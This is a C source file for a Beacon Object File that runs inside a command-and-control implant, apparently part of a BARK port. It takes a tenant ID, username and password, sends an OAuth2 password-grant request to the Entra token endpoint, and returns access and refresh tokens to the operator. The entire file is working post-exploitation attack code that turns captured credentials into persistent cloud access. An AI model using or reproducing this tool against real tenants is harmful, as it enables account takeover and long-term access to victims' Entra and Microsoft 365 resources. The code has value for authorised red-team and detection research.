/*
 * get_entra_refresh_token_with_up.c — BARK BOF
 * Get-EntraRefreshTokenWithUsernamePassword — Password grant — get refresh token (scope: openid offline_access)
 *
 * Args : tenantId, username, password, clientId
 *
 * The response from the openid+offline_access scope includes access_token,
 * refresh_token, AND id_token.  BarkTokenPost handles this safely with
 * BeaconOutput (no vsnprintf buffer) and prints access_token + refresh_token.
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

#define PATH_BUF_SIZE 512
#define BODY_BUF_SIZE 4096
#define ENC_BUF_SIZE  2048

void go(char *args, int alen)
{
    datap  parser;
    LPWSTR widePath    = NULL;
    char  *pathBuf     = NULL;
    char  *bodyBuf     = NULL;
    char  *encPassword = NULL;
    char  *encUsername = NULL;
    char  *tenantId = NULL, *username = NULL, *password = NULL, *clientId = NULL;

    BeaconPrintf(CALLBACK_OUTPUT,
        "[BARK] entered get_entra_refresh_token_with_up (alen=%d)\n", alen);

    BeaconDataParse(&parser, args, alen);
    tenantId = BeaconDataExtract(&parser, NULL);
    username = BeaconDataExtract(&parser, NULL);
    password = BeaconDataExtract(&parser, NULL);
    clientId = BeaconDataExtract(&parser, NULL);

    if (!tenantId) tenantId = "";
    if (!username) username = "";
    if (!password) password = "";
    if (!clientId) clientId = "";

    BeaconPrintf(CALLBACK_OUTPUT,
        "[BARK] args: tenantId.len=%d username.len=%d password.len=%d clientId.len=%d\n",
        (int)MSVCRT$strlen(tenantId), (int)MSVCRT$strlen(username),
        (int)MSVCRT$strlen(password), (int)MSVCRT$strlen(clientId));

    if (MSVCRT$strlen(tenantId) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Usage: bark_get_entra_refresh_token_with_up <tenantId> <username> <password> [clientId]\n");
        return;
    }
    if (MSVCRT$strlen(clientId) == 0)
        clientId = "1b730954-1685-4b74-9bfd-dac224a7b894";

    pathBuf     = (char *)HAlloc(PATH_BUF_SIZE);
    bodyBuf     = (char *)HAlloc(BODY_BUF_SIZE);
    encPassword = (char *)HAlloc(ENC_BUF_SIZE);
    encUsername = (char *)HAlloc(ENC_BUF_SIZE);
    if (!pathBuf || !bodyBuf || !encPassword || !encUsername) {
        BeaconPrintf(CALLBACK_ERROR, "[-] HeapAlloc failed\n");
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[BARK] heap buffers allocated\n");

    UrlEncode(username, encUsername, ENC_BUF_SIZE);
    UrlEncode(password, encPassword, ENC_BUF_SIZE);

    MSVCRT$sprintf_s(pathBuf, PATH_BUF_SIZE, "/%s/oauth2/v2.0/token", tenantId);
    widePath = MbsToWcs(pathBuf);
    if (!widePath) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n");
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[BARK] path built: %s\n", pathBuf);

    MSVCRT$sprintf_s(bodyBuf, BODY_BUF_SIZE,
        "grant_type=password"
        "&scope=openid%%20offline_access"
        "&username=%s"
        "&password=%s"
        "&client_id=%s",
        encUsername, encPassword, clientId);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Get-EntraRefreshTokenWithUsernamePassword for %s\n", username);

    BarkTokenPost(widePath, bodyBuf);

cleanup:
    if (widePath)    HFree(widePath);
    if (pathBuf)     HFree(pathBuf);
    if (bodyBuf)     HFree(bodyBuf);
    if (encPassword) HFree(encPassword);
    if (encUsername) HFree(encUsername);
}
